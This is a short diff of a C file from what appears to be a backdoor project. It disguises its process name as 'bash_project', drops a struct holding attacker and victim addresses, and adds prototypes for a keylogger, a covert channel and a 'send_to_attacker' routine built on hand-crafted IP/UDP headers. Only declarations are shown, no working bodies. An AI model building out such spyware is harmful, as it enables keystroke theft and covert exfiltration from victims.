@@ -14,17 +14,6 @@
 #define MASK "bash_project"
 
 
-struct options_victim {
-    char attacker_ip[INET_ADDRSTRLEN];
-    char my_ip[INET_ADDRSTRLEN];
-    int victim_socket;
-    uint16_t attacker_port;
-    char received_buffer[S_ARR_SIZE];
-    char instruction[S_ARR_SIZE];
-    char sending_buffer[OUTPUT_SIZE];
-    bool ip_flag;
-};
-
 const char *builtin_str[] = {
         "cd",
         "exit"
@@ -48,6 +37,10 @@ int launch(char **command_arr, u_char *args);
 void send_to_attacker(u_char *args);
 unsigned short create_udp_header(struct udphdr* uh, uint16_t port);
 unsigned short create_ip_header(struct iphdr* ih, char c, u_char *args);
+
+void* activate_keylogger(void* arg);
+void* activate_cvc(void* arg);
+void activate_select_multiplexing(void* arg);
 
 
 int (*builtin_func[]) (char **) = {
